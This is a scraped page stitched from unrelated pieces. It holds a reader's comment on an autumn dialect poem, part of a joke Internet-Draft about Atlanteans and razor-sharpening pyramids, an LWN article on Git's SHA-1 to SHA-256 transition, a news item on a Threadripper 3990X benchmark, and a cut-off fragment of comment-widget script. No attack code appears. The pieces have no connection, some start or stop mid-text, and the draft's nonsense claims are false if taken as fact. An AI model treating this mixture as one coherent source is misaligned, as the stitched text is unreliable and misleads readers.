&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;When the heat of summer's over and the coolin' fall is here&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Those first few days when fall really sets in, when you start to get that frost and the leaves are falling and you have that wonderful musky aroma of their decay, there's something almost magical about it and you just stand there drinking it in. This takes me there.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;A bit later:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;But the air's so appetizin'; and the landscape through the haze&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;Of a crisp and sunny monring of the airly autumn days&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;Is a pictur' that no painter has the colorin' to mock -&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;When the frost is on the punkin and fodder's in the shock.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Again, the smells and chill of that crisp and often damp air with all of those aromas starting to rise as the sun comes up. The beautiful reds and oranges and browns and champagne yellows of the leaves of the changing trees&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;The husky, rusty russel of the tossels of the corn,&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;There's something about wind blowing through standing corn that is almost ready to harvest, I read this and I hear that, 'rusty russel of the tossels' is a perfect description.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;And the raspin' of the tangled leaves, as golden as the morn;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;As the laves have started to fall in great numbers and you traipse through them they do make a rasping sound mixed with this every so slightly wet sound as mositure trapped between them makes them peel and tangle.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;Then your apples all is gethered, and the ones a feller keeps&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;Is poured around the celler-floor in red and yeller heaps;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;And your cider-makin's over, and your wimmern-folks is through&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;I can almost feel that fuzzy, sweet, crisp taste of warm cider lighting my mouth up and warming me.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;With their mince and apple-butter, and theyr souse and sausage, too!&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Boom! Always makes me feel the cool air, catch a hint of memory of the smells of fall and want some warm biscuits slathered in apple butter and the wonderful porky-vinegar magic that is souse.&lt;/span&gt;&lt;/p&gt;

   All too often one reads something in the press, or some ravings on a
   mailing list that reference some Internet Draft, that claim that &quot;the
   IETF thinks that XXX&quot; or that the ID is an IETF document, and so
   represents support by the IETF.

   Repeatedly pointing at the RFC Editor page, carefully explaining what
   an ID is (and isn't), describing how consensus is reached, detailing
   the Independent Stream, etc doesn't seems to accomplish much.

   So, here is an Internet Draft.  I wrote it.  It's full of nonsense.
   It doesn't represent the &quot;IETF's views&quot;; it doesn't mean that the
   IETF, the IESG, the RFC editor, any IETF participant, my auntie on my
   fathers side twice removed, me, or anyone else believes any of the
   drivel in it.  [Editor note: Interestingly, after publishing version
   -00 of this ID I got some feedback saying that some participants *do*
   believe the below.  As I plan to actually get this published as a
   (probably AD sponsored) RFC, I guess someone will need to judge
   consensus at IETF LC ]

   Readers are expected to be familiar with &lt;a href=&quot;https://tools.ietf.org/html/draft-wkumari-not-a-draft-06#section-2.5&quot;&gt;Section 2.5&lt;/a&gt; of[RFC2410]

&lt;span class=&quot;grey&quot;&gt;Internet-Draft           Anyone can write an ID               April 2014&lt;/span&gt;


&lt;span class=&quot;h2&quot;&gt;&lt;a class=&quot;selflink&quot; name=&quot;section-2&quot; href=&quot;https://tools.ietf.org/html/draft-wkumari-not-a-draft-06#section-2&quot; id=&quot;section-2&quot;&gt;2&lt;/a&gt;.  Background&lt;/span&gt;

   Pyramids are good for sharpening razor blades.  The ancient Egyptians
   has a major problem - wearing a big, bushy beard in the desert is
   uncomfortable.  Unfortunately the safely razor hadn't been invented
   yet, and so they all had to use straight razors.  Unfortunately camel
   leather makes a very poor strop, hippopotamus leather was reserved
   for the pharaohs and crocodile leather, while suitable, had the
   unfortunate property of being wrapped around crocodiles.

   So, the ancient Egyptians had to come up with an alternative.  This
   led them to design and build hulking big monuments (with the
   assistance of ancient aliens) to sharpen mass quantities of straight
   razors.  In order to defray the large costs of building pyramids, the
   builders would charge a sharpening fee.  For a single bushel of corn,
   you could buy 27.5 sharpening tokens.  Each one of there tokens could
   be redeemed for 6.3 hours of sharpening time.

   This all worked really well until approximately 1600BCE, at which
   time the fleeing Atlanteans brought mass quantities of lightly tanned
   eel leather into Egypt, causing the collapse of straight razor
   sharpening market.  This in turn led to the collapse of the stone
   quarrying industry, which negatively affected the copper and sandal
   manufacturers.  The collapse of the entire system followed shortly
   after.

   This led to the cliche &quot;Don't allow eel bearing Atlanteans into your
   country; economic ruin follows close behind&quot;.  Due to the overly
   specific nature of this phrase it never really caught on.  This
   document rectifies this.

&lt;span class=&quot;h2&quot;&gt;&lt;a class=&quot;selflink&quot; name=&quot;section-3&quot; href=&quot;https://tools.ietf.org/html/draft-wkumari-not-a-draft-06#section-3&quot; id=&quot;section-3&quot;&gt;3&lt;/a&gt;.  Usage&lt;/span&gt;

   Many protocols send periodic &quot;hello&quot; messages, or respond to
   liveliness probes.  Other protocols (primarily for network monitoring
   or testing) send traffic to cause congestion or similar.  All ASCII
   based IETF protocols should use the phrase &quot;Don't allow eel bearing
   Atlanteans into your country; economic ruin follows close behind&quot; as
   the payload of such messages.  This phrase is 88 characters; if your
   protocol needs to align on 32bit boundaries it MAY be padded with
   Null (\0) characters.

   The closely related phrase &quot;My hovercraft is full of eels&quot; SHOULD be
   used by any protocol incapable of encoding the ASCII character 'b'
   (0x62).  Internationalized protocols SHOULD use an appropriate
   translation.  Some devices are severely bandwidth and / or memory
   constrained.  There devices MAY use the ordinals 0 and 1 to represent
   the strings &quot;Don't allow eel bearing Atlanteans into your country;

   economic ruin follows close behind&quot; and &quot;My hovercraft is full of
   eels&quot; respectively.  Partially constrained devices SHOULD use the
   string &quot;TBA3&quot; (or the ordinal TBA3).

   Unlike most IETF efforts, this document is not embarrassed to clearly
   state that we are simply shuffling more stuff in while we have the
   editor open.

   A common source of confusion is the difference between &quot;routing
   protocols&quot; and &quot;routing protocols&quot;, especially when configuring BGP
   peering sessions between civilized countries and the rest of the
   world.  In order to clearly differentiate these terms we assign the
   ordinal 98 to be &quot;routing protocols&quot; and 0x62 to be &quot;routing
   protocols&quot;.  Or course, protocols incapable of encoding 0x62 should
   use the string &quot;My hovercraft is full of eels&quot;, a suitable
   translation of this phrase, or the ordinal 1.

&lt;span class=&quot;h2&quot;&gt;&lt;a class=&quot;selflink&quot; name=&quot;section-4&quot; href=&quot;https://tools.ietf.org/html/draft-wkumari-not-a-draft-06#section-4&quot; id=&quot;section-4&quot;&gt;4&lt;/a&gt;.  IANA Considerations&lt;/span&gt;

   The IANA is requested to create and maintain a registry named
   &quot;Registry of important strings, suitable for use as idle signalling
   transmissions (ROISSFAIST)&quot;.

   Documents requesting assignments from this registry MUST include the
   string, and the ordinal being requested.  Choosing an ordinal at
   random is encouraged (to safe the IANA from having to do this).  The
   ordinals 17, 42 and 6.12 are reserved to reduce confusion.  The
   ordinals 18 and 19 are reserved for the strings &quot;Reserved&quot; and
   &quot;Unassigned&quot; respectively.  Unfortunately the ordinal 20 was used by
   two earlier, competing proposals, and so can mean either &quot;Color&quot; or
   Colour&quot;.  Implementations are encouraged to disambiguate based upon
   context.

   Additions to the registry are permitted by Standards Action, if the
   requester really really wants one, or by purchasing a nice bottle of
   wine for the IANA folk.  Hierarchical Allocation is NOT permitted, as
   it looks too much like a pyramid.

   The initial assignments for the registry are as follows:

   [&lt;a name=&quot;ref-RFC2028&quot; id=&quot;ref-RFC2028&quot;&gt;RFC2028&lt;/a&gt;] states that &quot;The IANA functions as the &quot;top of the pyramid&quot;
   for DNS and Internet Address assignment establishing policies for
   these functions.&quot;  By ensuring that network operators watching data
   traffic fly past (using tools like network sniffers and / or
   oscilloscopes (and doing very fast binary to ASCII conversions in
   their heads)) are constantly reminded about the danger posed by folk
   from Atlantis, we ensure that, if the island of Atlantis rises again
   from the deep, builds a civilization and then starts tanning high
   quality eel leather, the DNS and Address assignment policies at least
   will survive.

   More research into if pyramids can also be used to make the latches
   grow back on RJ-45connectors after they've been broken off by ham
   fisted data centre operators is needed.

&lt;p&gt;By &lt;strong&gt;Jonathan Corbet&lt;/strong&gt;&lt;br /&gt;February 3, 2020&lt;/p&gt;
The Git source-code management system is famously built on the SHA‑1 hashing algorithm, which has become an increasingly weak foundation over the years. SHA‑1 is now considered to be broken and, despite the fact that it does not yet seem to be so broken that it could be used to compromise Git repositories, users are increasingly worried about its security. The good news is that work on moving Git past SHA‑1 has been underway for some time, and is slowly coming to fruition; there is a version of the code that can be looked at now.
&lt;h4&gt;How Git works, simplified&lt;/h4&gt;
&lt;p&gt;To understand why SHA‑1 matters to Git, it helps to have an idea of how the underlying Git database works. What follows is an oversimplified view of how Git manages objects that can be skipped by readers who are already familiar with this material.&lt;/p&gt;
&lt;p&gt;Git is often described as being built on a content-addressable filesystem — one where you can look up an object if you know that object's contents. That may not seem particularly useful, but there's more than one way to &quot;know&quot; those contents. In particular, you can substitute a cryptographic hash for the contents themselves; that hash is rather easier to work with and has some other useful properties.&lt;/p&gt;
&lt;p&gt;Git stores a number of object types, using SHA‑1 hashes to identify them. So, for example, the SHA‑1 hash of &lt;tt&gt;drivers/block/floppy.c&lt;/tt&gt; in a 5.6-merge-window kernel, as calculated by Git, is &lt;tt&gt;485865fd0412e40d041e861506bb3ac11a3a91e3&lt;/tt&gt;. Conceptually, at least, Git will store that version of &lt;tt&gt;floppy.c&lt;/tt&gt; in a file, using that hash as its name; early versions of Git actually did that. If somebody makes a change to &lt;tt&gt;floppy.c&lt;/tt&gt;, even just removing an extra space from the end of a line, the result will have a completely different SHA‑1 hash and will be stored under a different name.&lt;/p&gt;
&lt;p&gt;A Git repository is thus full of objects (often called &quot;blobs&quot;) with SHA‑1 names; since a new one is created for each revision of a file, they tend to proliferate. Your editor's kernel repository currently contains 8,647,655 objects. But blobs are not the only types of objects stored in a Git repository.&lt;/p&gt;
&lt;p&gt;An individual file object holds a particular set of contents, but it has no information about where that file appears in the repository hierarchy. If &lt;tt&gt;floppy.c&lt;/tt&gt; is moved to &lt;tt&gt;drivers/staging&lt;/tt&gt; someday, its hash will remain the same, so its representation in the Git object database will not change. Keeping track of how files are organized into a directory hierarchy is the job of a &quot;tree&quot; object. Any given tree object can be thought of as a collection of blobs (each identified by its SHA‑1 hash, of course) associated with their location in the directory tree. As one might expect, a tree object has an SHA‑1 hash of its own that is used to store it in the repository.&lt;/p&gt;
&lt;p&gt;Finally, a &quot;commit&quot; object records the state of the repository at a particular point in time. A commit contains some metadata (committer, date, etc.) along with the SHA‑1 hash of a tree object reflecting the current state of the repository. With that information, Git can check out the repository at a given commit, reproducing the state of the files in the repository at that point. Importantly, a commit also contains the hash of the previous commit (or multiple commits in the case of a merge); it thus records not just the state of the repository, but the previous state, making it possible to determine exactly what changed.&lt;/p&gt;
&lt;p&gt;Commits, too, have SHA‑1 hashes, and the hash of the previous commit (or commits) is included in that calculation. If two chains of development end up with the same file contents, the resulting commits will still have different hashes. Thus, unlike some other source-code management systems, Git does not (conceptually, at least) record &quot;deltas&quot; from one revision to the next. It thus forms a sort of blockchain, with each block containing the state of the repository at a given commit.&lt;/p&gt;
&lt;h4&gt;Why hash security matters&lt;/h4&gt;
&lt;p&gt;The compromise of kernel.org in 2011 created a fair amount of concern about the security of the kernel source repository. If an attacker were able to put a backdoor into the kernel code, the result could be the eventual compromise of vast numbers of deployed systems. Malicious code placed into the kernel's build system could be run behind any number of corporate and government firewalls. It was not a pleasant scenario but, thanks to the use of Git, it was also not a particularly likely one.&lt;/p&gt;
&lt;p&gt;Let us imagine that some attacker has gained control of kernel.org and wants to place some evil code into &lt;tt&gt;floppy.c&lt;/tt&gt; — something unspeakable like a change that replaces random sectors with segments from Rick Astley videos, say. Somehow this change would have to be incorporated into the repository so that it would be included in subsequent pulls. But the change to &lt;tt&gt;floppy.c&lt;/tt&gt; changes its SHA‑1 hash; that, in turn, will change every tree object containing the evil &lt;tt&gt;floppy.c&lt;/tt&gt; and every commit that includes it as well. The head commit for the repository would certainly change, as would older ones if the attacker tried to make the change appear to have happened in the distant past.&lt;/p&gt;
&lt;p&gt;Somewhere out there is certainly some developer who actually memorizes SHA‑1 hashes and would immediately notice a change like that. The rest of us probably would not, but Git will. The distributed nature of Git means that there are many copies of the repository out there; as soon as a developer tries to pull from or push to the corrupted repository, the operation will fail due to the mismatched hashes between the two repositories and the corruption will come to light.&lt;/p&gt;
&lt;p&gt;Repository integrity is also protected by signed tags, which include the hash for a specific commit and a cryptographic signature. The chain of hashes leading up to a given tag cannot be changed without invalidating the tag itself. The use of signed tags is not universal in the kernel community (and rare to nonexistent in many other projects), but mainline kernel releases are signed that way. When one sees Linus Torvalds's signature on a tag, one knows that the repository is in the state he intended when the tag was applied.&lt;/p&gt;
&lt;p&gt;All of this depends on the strength of the hash used, though. If our attacker is able to modify &lt;tt&gt;floppy.c&lt;/tt&gt; in such a way that its SHA‑1 hash does not change, that modification could well go undetected. That is why the news of SHA‑1 hash collisions creates concern; if SHA‑1 cannot be trusted to detect hostile changes, then it is no longer assuring the integrity of the repository.&lt;/p&gt;
&lt;p&gt;The world has not ended yet, fortunately. It is still reasonably expensive to create any sort of SHA‑1 hash collision at all. Creating any new version of &lt;tt&gt;floppy.c&lt;/tt&gt; with the same hash would be hard. An attacker would not just have to do that, though; this new version would have to contain the desired hostile code, still function as a working floppy driver, and not look like an obfuscated C code contest entry (at least not more than it already does). Creating such a beast is probably still unfeasible. But the writing is clearly on the wall; the time when SHA‑1 is too weak for Git is rapidly approaching.&lt;/p&gt;
&lt;h4&gt;Moving to a stronger hash&lt;/h4&gt;
&lt;p&gt;Back in the early days of Git, Torvalds was &lt;a href=&quot;https://lore.kernel.org/lkml/Pine.LNX.4.58.0504090902170.1267@ppc970.osdl.org/&quot;&gt;unconcerned&lt;/a&gt; about the possibility of SHA‑1 being broken; as a result, he never designed in the ability to switch to a different hash; SHA‑1 is fundamental to how Git operates. &lt;a href=&quot;https://lwn.net/Articles/715716/&quot;&gt;As of 2017&lt;/a&gt;, the Git code was full of declarations like:&lt;/p&gt;
&lt;pre&gt;
    unsigned char sha1[20];
&lt;/pre&gt;
&lt;p&gt;In other words, the type of the hash was deeply wired into the code, and it was assumed that hashes would fit into a 20-byte array.&lt;/p&gt;
&lt;p&gt;At that time, Git developer brian m. carlson was already at work to separate the Git core from the specific hash being used; indeed, he had been working on it since 2014. It was unclear what hash might eventually replace SHA‑1, but it was possible to create an abstract type for object hashes that would hide that detail. At this point, that work is done and merged.&lt;/p&gt;
&lt;p&gt;The decision on a replacement hash algorithm was &lt;a href=&quot;https://github.com/bk2204/git/commit/0ed8d8da374f648764758f13038ca93af87ab800&quot;&gt;made in 2018&lt;/a&gt;. A number of possibilities were considered, but the Git community settled on SHA‑256 as the next-generation Git hash. The commit enshrining that choice cites its relatively long history, wide support, and good performance. The community has also decided on (and mostly implemented) a transition plan that is &lt;a href=&quot;https://github.com/bk2204/git/blob/transition-stage-4/Documentation/technical/hash-function-transition.txt&quot;&gt;well documented&lt;/a&gt;; most of what follows is shamelessly cribbed from that file.&lt;/p&gt;
&lt;p&gt;With the hash algorithm abstracted out of the core Git code, the transition is, on the surface, relatively easy. A new version of Git can be made with a different hash algorithm, along with a tool that will convert a repository from the old hash to the new. With a simple command like:&lt;/p&gt;
&lt;pre&gt;
   git convert-repo --to-hash=sha-256 --frobnicate-blobs --climb-subtrees \
        --liability-waiver=none --use-shovels --carbon-offsets
&lt;/pre&gt;
&lt;p&gt;a user can leave SHA‑1 behind (note that the specific command-line options may differ). There is only one problem with this plan, though: most Git repositories do not operate in a vacuum. This sort of flag-day conversion might work for a tiny project, but it's not going to work well for a project like the kernel. So Git needs to be able to work with both SHA‑1 and SHA‑256 hashes for the foreseeable future. There are a number of implications to this requirement that make themselves felt throughout the system.&lt;/p&gt;
&lt;p&gt;One of the transition design goals is that SHA‑256 repositories should be able to interoperate with SHA‑1 repositories managed by older versions of Git. If kernel.org updates to the new format, developers running older versions should still be able to pull from (and push to) that site. That will only happen if Git continues to track the SHA‑1 hashes for each object indefinitely.&lt;/p&gt;
&lt;p&gt;For blobs, this tracking will happen through the maintenance of a set of translation tables; given a hash generated with one algorithm, Git will be able to look up the corresponding hash from the other. Needless to say, this lookup will only succeed for objects that are actually in the repository. These translation tables will be maintained in the &quot;pack files&quot; that hold most objects in a contemporary Git repository. There will be a separate table for &quot;loose objects&quot; that are stored as separate files rather than in packs; the cost of lookups in that table is seen as being high enough that measures need to be taken to minimize the number of loose objects in any given repository.&lt;/p&gt;
&lt;p&gt;The handling of other object types is a bit more complicated. An SHA‑1 tree object, for example, must contain SHA‑1 hashes for the objects in the tree. So if such a tree object is requested, Git will have to locate the SHA‑256 version, then translate all the object hashes contained within it before returning it. Similar translations will be required for commits. Signed tags will contain both hashes.&lt;/p&gt;
&lt;p&gt;With this machinery in place, Git installations will be interoperable during the transition. Eventually, all users will have upgraded to SHA‑256-capable versions of Git, at which point repository owners could begin turning off the SHA‑1 capability and removing the translation tables. The transition will, at that point, be complete.&lt;/p&gt;
&lt;h4&gt;Some inconvenient details&lt;/h4&gt;
&lt;p&gt;There are likely to be some glitches along the way, naturally. One of them is a simple human-factors problem: when a user supplies a hash value, should it be interpreted as SHA‑1 or SHA‑256? In some cases, it's unambiguous; SHA‑1 hashes are 160 bits wide, so a 256-bit hash must be SHA‑256, for example. But a shorter hash could be either, since hashes can be (and often are) abbreviated. The transition document describes a multi-phase process during which the interpretation of hash values would change, but most users are unlikely to go through that process.&lt;/p&gt;
&lt;p&gt;There is, of course, a way to unambiguously give a hash value in the new Git code, and they can even be mixed on the command line; this example comes from the transition document:&lt;/p&gt;
&lt;pre&gt;
    git --output-format=sha1 log abac87a^{sha1}..f787cac^{sha256}
&lt;/pre&gt;
&lt;p&gt;For a Git user interface this is relatively straightforward and concise, but one can still imagine that users might tire of it relatively quickly. The obvious solution to this sort of bracket fatigue is to fully transition a project to SHA‑256 as quickly as possible.&lt;/p&gt;
&lt;p&gt;There is another issue out there, though: there are a &lt;em&gt;lot&lt;/em&gt; of SHA‑1 hash values in the wild. The kernel repository currently contains over 40,000 commits with a Fixes: tag; each one of those includes an SHA‑1 hash. These hash values also can be found in bug-tracker histories, release announcements, vulnerability disclosures, and more. In a repository without SHA‑1 compatibility, all of those hashes will become meaningless. To address this issue, one can imagine that the Git developers may eventually add a mode where translations for old SHA‑1 hashes remain in the repository, but no SHA‑1 hashes for new objects are added.&lt;/p&gt;
&lt;h4&gt;Current state&lt;/h4&gt;
&lt;p&gt;Much of the work to implement the SHA‑256 transition has been done, but it remains in a relatively unstable state and most of it is not even being actively tested yet. In mid-January, carlson &lt;a href=&quot;https://lwn.net/ml/git/20200113124729.3684846-1-sandals@crustytoothpaste.net/&quot;&gt;posted&lt;/a&gt; the first part of this transition code, which clearly only solves part of the problem:&lt;/p&gt;
&lt;p&gt;First, it contains the pieces necessary to set up repositories and write _but not read_ extensions.objectFormat. In other words, you can create a SHA‑256 repository, but will be unable to read it.&lt;/p&gt;
&lt;p&gt;The value of write-only repositories is generally agreed to be relatively low; not even SCCS was so limited. Carlson's purpose in posting the code at this stage is to try to reveal any core issues that will be harder to change as the work progresses. Developers who are interested in where Git is going may well want to take a close look at this code; converting their working repositories over is not recommended, though.&lt;/p&gt;
&lt;p&gt;As it turns out, carlson's work goes well beyond what has been put out for testing now; he will post it when he is ready, but really curious people can see it now in &lt;a href=&quot;https://github.com/bk2204/git/tree/transition-stage-4&quot;&gt;his GitHub repository&lt;/a&gt;. This work is unlikely to land on the systems of most Git users for some time yet, but it is good to know that it is getting close to ready. The Git developers (carlson in particular) have quietly been working on this project for years; we will all benefit from it.&lt;/p&gt;

No, we do no have a gnarly playlist to share, but we can direct your attention to a benchmark database showcasing AMD's &lt;a href=&quot;https://hothardware.com/news/amd-confirms-ryzen-threadripper-3990x&quot;&gt;Ryzen Threadripper 3990X&lt;/a&gt; processor, which is the tech equivalent of heavy metal.&lt;/div&gt;

&lt;p&gt;As you may already know, the Threadripper 3990X is a beastly chip. Popping open the hood reveals 64 physical cores and 128 threads of high-end desktop (HEDT) muscle, with a 2.9GHz base clock, 4.3GHz boost clock, and 256MB of L3 cache (along with 32MB of L2 cache and 4MB of L1 cache). It all comes wrapped in a high-octane 280W package.&lt;/p&gt;

&lt;div readability=&quot;11.834482758621&quot;&gt;&lt;a href=&quot;https://hothardware.com/tags/amd&quot;&gt;AMD&lt;/a&gt; announced the Threadripper 3990X at CES 2020. It is not out yet, but when it arrives to retail, it will take its place at the top of the totem pole. As to how it performs, the folks at &lt;em&gt;Overclockers.ru&lt;/em&gt; spotted &lt;a href=&quot;https://ranker.sisoftware.co.uk/show_device.php?q=c9a598d994d0f0a2dba1c4aa8adeb6c4a1c0a4d6bfcfbfdaa888bb82bb8bd3f3c5f1dc9ff082e7c1a69bb687a1d3eedff990ad9dbbd3eedef880bd8dabceab96a680f3cef6&amp;amp;l=en&quot; target=&quot;_blank&quot;&gt;the chip sitting pretty&lt;/a&gt; in a SiSoftware SANDRA database entry. Have a look...&lt;/div&gt;

&lt;div&gt;&lt;a href=&quot;https://hothardware.com/photo-gallery/NewsItem/50637?image=big_sandra_threadripper_3990x.jpg&amp;amp;tag=popup&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://images.hothardware.com/contentimages/newsitem/50637/content/small_sandra_threadripper_3990x.jpg&quot; alt=&quot;SiSoftware&quot; height=&quot;386px&quot; class=&quot;dimension1&quot; data-src=&quot;https://images.hothardware.com/contentimages/newsitem/50637/content/small_sandra_threadripper_3990x.jpg&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;strong&gt;Click to Enlarge (Source: SiSoftware - Official Live Ranker)&lt;/strong&gt;&lt;br/&gt;&lt;/div&gt;

&lt;p&gt;As shown in the database entry above, the Threadripper 3990X achieved a Processor Arithmetic score of 1,786.22 GOPS while running at 4.35GHz. That's a touch above what AMD rates the maximum boost clock, so it is possible the CPU was overclocked for this benchmark run (assuming the frequency is accurate).&lt;/p&gt;

&lt;div readability=&quot;13.577586206897&quot;&gt;To put that score into perspective, it is nearly 18 percent higher than a system with two second generation &lt;a href=&quot;https://hothardware.com/reviews/intel-cascade-lake-xeon-and-optane-dc-persistent-memory&quot;&gt;Intel Xeon Scalable Platinum 8280&lt;/a&gt; processors (Cascade Lake). Each Xeon Platinum 8280 CPU features 28 cores and 56 threads clocked at 2.7GHz to 4GHz, with 38.5MB of L3 cache, so a dual Xeon Platinum 8280 setup rocks 56 cores and 112 threads.&lt;/div&gt;
&lt;div&gt;&lt;figure&gt;&lt;img alt=&quot;Dual Socket Intel Xeon Sandra score&quot; src=&quot;https://images.hothardware.com/contentimages/newsitem/50637/content/Dual-Socket-Intel-Xeon-Sandra-score.jpg&quot; height=&quot;270px&quot; class=&quot;dimension1&quot; data-src=&quot;https://images.hothardware.com/contentimages/newsitem/50637/content/Dual-Socket-Intel-Xeon-Sandra-score.jpg&quot;/&gt;&lt;figcaption&gt;&lt;em&gt;&lt;strong&gt;Dual Socket Xeon Scalable Platinum 8280 Results&lt;/strong&gt;&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;br/&gt;&lt;/div&gt;
&lt;div readability=&quot;14.985590778098&quot;&gt;Simple math tells us the Threadripper 3990X has the advantage in core and thread counts, at +8 and +16, respectively. So to post a higher SANDRA score is not surprising. After all, the Threadripper 3990X is based on AMD's latest generation 7-nanometer &lt;a href=&quot;https://hothardware.com/reviews/amd-zen-2-architecture-explained&quot;&gt;Zen 2 CPU architecture&lt;/a&gt;. But here's the thing, each Xeon Platinum 8280 CPU costs around $10,000.&lt;/div&gt;

&lt;p&gt;In other words, the Threadripper 3990X is outperforming $20,000 worth of Xeon silicon in this particular benchmark. AMD's flagship HEDT chip, meanwhile, will cost a fraction of two Xeon Platinum 8280 processors.&lt;/p&gt;
&lt;div readability=&quot;17.948447204969&quot;&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Ryzen Threadripper 3990X (64 cores / 128 threads, 2.9GHz to 4.3GHz): &lt;/strong&gt;$3,990&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ryzen Threadripper 3970X (32 cores / 64 threads, 3.7GHz to 4.5GHz):&lt;/strong&gt; $1,999&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ryzen Threadripper 3960X: (24 cores / 48 threads, 3.8GHz to 4.5GHz):&lt;/strong&gt; $1,399&lt;/li&gt;
&lt;/ul&gt;&lt;div readability=&quot;12.994011976048&quot;&gt;Looking at the MSRPs of the three Threadripper processors, AMD is asking $58.29 per core on the Threadripper 3960X, $62.47 per core on the Threadripper 3970X, and $62.34 per core on the Threadripper 3990X. It remains to be seen what the rumored 48-core/96-thread &lt;a href=&quot;https://hothardware.com/news/amd-ryzen-threadripper-3980x-48-core&quot;&gt;Ryzen Threadripper 3980X&lt;/a&gt; will cost if it wedges itself into the lineup.&lt;/div&gt;

&lt;p&gt;Even at $3,990, the Threadripper 3990X offers solid value in the workstation segment, compared to the Xeon Platinum range. It's not cheap by means, but for those who need this kind of multi-threaded horsepower, it becomes an intriguing option.&lt;br/&gt;&lt;/p&gt;

                });

            } else {

                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
                jQuery('head').append(dsq);

            }
            
            jQuery('.show-disqus').show();
